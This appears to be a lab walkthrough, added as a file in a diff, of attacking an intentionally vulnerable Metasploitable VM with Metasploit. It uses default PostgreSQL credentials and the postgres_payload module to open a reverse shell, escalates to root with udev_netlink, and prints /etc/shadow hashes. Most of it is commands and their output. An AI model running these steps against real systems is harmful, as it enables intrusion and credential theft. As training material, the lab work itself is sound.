@@ -1,0 +1,120 @@
+
+✅ PostgreSQL Remote Exploitation & Privilege Escalation on Metasploitable
+1️⃣ Module Configuration and Execution
+msf > use exploit/linux/postgres/postgres_payload
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+
+Set Target Parameters
+msf exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.56.101
+RHOSTS => 192.168.56.101
+
+msf exploit(linux/postgres/postgres_payload) > set USERNAME postgres
+USERNAME => postgres
+
+msf exploit(linux/postgres/postgres_payload) > set PASSWORD postgres
+PASSWORD => postgres
+
+Configure Payload and Listener
+msf exploit(linux/postgres/postgres_payload) > set PAYLOAD linux/x86/shell_reverse_tcp
+PAYLOAD => linux/x86/shell_reverse_tcp
+
+msf exploit(linux/postgres/postgres_payload) > set LHOST 192.168.56.104
+LHOST => 192.168.56.104
+
+msf exploit(linux/postgres/postgres_payload) > set LPORT 4444
+LPORT => 4444
+
+Execute Exploit
+msf exploit(linux/postgres/postgres_payload) > run
+[*] Started reverse TCP handler on 192.168.56.104:4444 
+[*] 192.168.56.101:5432 - 192.168.56.101:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu
+[*] 192.168.56.101:5432 - Uploaded as /tmp/ItIbokyF.so
+[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.101:53199)
+
+Verify Access
+whoami
+postgres
+
+Background the Session
+^Z
+Background session 1? [y/N]  y
+
+2️⃣ Active Session Verification
+msf > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  1         shell x86/linux               192.168.56.104:4444 ->
+                                          192.168.56.101:53199
+
+3️⃣ Local Privilege Escalation (udev_netlink)
+Load Exploit
+msf > use exploit/linux/local/udev_netlink
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+
+Configure Session and Listener
+msf exploit(linux/local/udev_netlink) > set SESSION 1
+SESSION => 1
+
+msf exploit(linux/local/udev_netlink) > set LHOST 192.168.56.104
+LHOST => 192.168.56.104
+
+Execute Exploit
+msf exploit(linux/local/udev_netlink) > run
+[*] Started reverse TCP handler on 192.168.56.104:4444 
+[*] Attempting to autodetect netlink pid...
+[+] Found netlink pid: 2421
+[*] Writing payload executable to /tmp/KEKHsAGZrg
+[*] Writing exploit executable to /tmp/kDaToTDiSh
+[*] chmod'ing and running it...
+[*] Sending stage...
+[*] Meterpreter session 2 opened (192.168.56.104:4444 -> 192.168.56.101:53200)
+
+4️⃣ Privilege Validation
+Open a Shell
+meterpreter > shell
+Process 5049 created.
+Channel 1 created.
+
+Confirm Root Access
+whoami
+root
+
+id
+uid=0(root) gid=0(root)
+
+Host Enumeration
+hostname
+metasploitable
+
+pwd
+/
+
+Shadow File Access
+cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+...
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+...
+
+Background the Shell
+^Z
+Background channel 1? [y/N]  y
+
+5️⃣ Final Session State
+msf > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                 Information            Connection
+  --  ----  ----                 -----------            ----------
+  1         shell x86/linux                              192.168.56.104:4444 ->
+                                                         192.168.56.101:53199
+
+  2         meterpreter x86/linux  root @ metasploitable 192.168.56.104:4444 ->
+                                  .localdomain           192.168.56.101:53200
